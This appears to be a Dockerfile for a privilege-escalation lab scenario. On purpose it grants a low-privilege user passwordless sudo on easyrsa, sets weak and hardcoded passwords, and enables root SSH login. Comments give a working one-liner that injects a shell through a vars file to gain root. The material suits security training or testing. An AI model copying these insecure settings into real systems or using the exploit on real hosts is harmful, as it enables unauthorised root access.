FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_easyrsa
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/easyrsa as root
# Exploit: echo 'set_var X "$(/bin/sh 1>&0)"' > /tmp/vars && sudo easyrsa --vars=/tmp/vars
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and easy-rsa
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        easy-rsa \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# easy-rsa installs to /usr/share/easy-rsa/easyrsa — create a symlink at /usr/bin/easyrsa
RUN ln -sf /usr/share/easy-rsa/easyrsa /usr/bin/easyrsa

# Verify easyrsa is available
RUN which easyrsa && ls -la /usr/bin/easyrsa

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# easyrsa accepts --vars= to source a vars file. By injecting shell commands
# via set_var, an attacker can execute arbitrary commands as root:
#   echo 'set_var X "$(/bin/sh 1>&0)"' > /tmp/evil-vars
#   sudo easyrsa --vars=/tmp/evil-vars
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/easyrsa" > /etc/sudoers.d/easyrsa && \
    chmod 440 /etc/sudoers.d/easyrsa

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]